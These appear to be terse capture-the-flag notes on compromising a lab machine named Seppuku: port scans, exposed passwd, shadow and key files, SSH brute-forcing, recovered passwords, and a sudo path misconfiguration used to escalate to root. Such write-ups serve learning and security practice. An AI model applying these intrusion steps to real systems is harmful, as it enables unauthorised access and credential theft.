21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7080/tcp open  empowerid
7601/tcp open  unknown
8088/tcp open  radan-http

21/tcp   open     ftp         vsftpd 3.0.3
22/tcp   open     ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
80/tcp   open     http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
1641/tcp filtered invision
8088/tcp open     http        LiteSpeed httpd
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-server-header: LiteSpeed
|_http-title: Seppuku
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2026-06-06T04:06:13-04:00
| smb2-time: 
|   date: 2026-06-06T08:06:15
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

192.168.123.90:8088
/index.php (Web console)
/docs

192.168.123.90:7601
/secret
passwd
shadow
hostname (seppuku)
password list

/keys
rsa key

use password list to bruteforce ssh into host seppuku
<img width="1675" height="192" alt="image" src="https://github.com/user-attachments/assets/bb653d1f-9f24-4c82-841e-902277c74a7f" />
login: seppuku   password: eeyoree


[+] SSH authorized_keys files:
/home/tanto/.ssh/authorized_keys
-rw-r--r-- 1 tanto tanto 381 May 13  2020 /home/tanto/.ssh/authorized_keys

[+] Hidden files in /home:
/home/samurai/.bashrc
/home/samurai/.bash_logout
/home/samurai/.profile
/home/seppuku/.passwd
/home/seppuku/.bashrc
/home/seppuku/.bash_logout
/home/seppuku/.profile
/home/tanto/.bashrc
/home/tanto/.bash_logout
/home/tanto/.profile

seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A

able to go into samurai using 
12345685213456!@!@A

sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*


since user tantos has a ssh folder i used the key found in 192.168.123.90:7601/keys to ssh in

<img width="639" height="193" alt="image" src="https://github.com/user-attachments/assets/8df4edeb-69fb-472d-abc4-cc33204d7d15" />

in tantos account i created
/home/tanto/.cgi_bin/bin
<img width="406" height="54" alt="image" src="https://github.com/user-attachments/assets/5fab32d7-c7ae-429e-bf2f-38d50038ce66" />

back in samurai
i run
<img width="840" height="115" alt="image" src="https://github.com/user-attachments/assets/c17870da-88f6-4cda-bec7-caf91d8c5dfa" />


